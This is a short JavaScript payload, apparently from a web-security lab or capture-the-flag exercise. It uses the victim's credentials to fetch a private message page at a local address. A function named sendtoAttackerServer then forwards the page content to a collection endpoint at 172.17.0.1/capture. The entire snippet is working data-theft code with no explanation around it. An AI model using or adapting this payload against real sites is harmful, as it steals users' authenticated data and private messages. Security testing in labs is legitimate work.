var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
        const response = xhr.responseText;
        sendtoAttackerServer(response)
    }
}
xhr.open('GET', 'http://127.0.0.1:80/message/3', true);
xhr.withCredentials = true;
xhr.send(null);

function sendtoAttackerServer(response){
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
        console.log("do nothing");
    }
  }
  xhr.open('GET', 'http://172.17.0.1/capture?data='+response, true);
  xhr.withCredentials = true;
  xhr.send(null);
}
